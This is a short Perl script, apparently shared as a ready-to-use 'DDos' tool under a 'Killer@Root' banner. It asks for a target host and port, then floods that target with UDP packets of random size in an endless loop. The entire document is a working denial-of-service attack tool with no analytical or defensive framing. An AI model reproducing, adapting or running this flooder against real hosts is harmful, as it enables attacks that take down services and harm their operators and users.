#!/usr/bin/perl
use io::socket;
# udp
#flooder.pl coded by disturbed_1

print q{
=================================================
=                                               =
=      Script , Perl DDos By Killer@Root        =
=          Killer@Root 2015 Script DDos         =
=               Killer@Root                     =
=               Killer@Root                     =
=               Killer@Root                     =
=                                               =
=                                               =
=                                               =
=                                               =
=                                               =
=                                               =
=                                               =
=================================================
};

print "Host: ";
chop ($host = <stdin>);
print "Port: ";
chop ($port = <stdin>);

{
$sock = IO::Socket::INET->new (
        PeerAddr => $host,
        PeerPort => $port,
        Proto => 'udp') || die "$! Make sure the IP/host or port number is correct";
}
packets:
while (1) {
$size = rand() * 200 * 2000;
print ("$host:$port packet size: $size\n");
send($sock, 0, $size);
}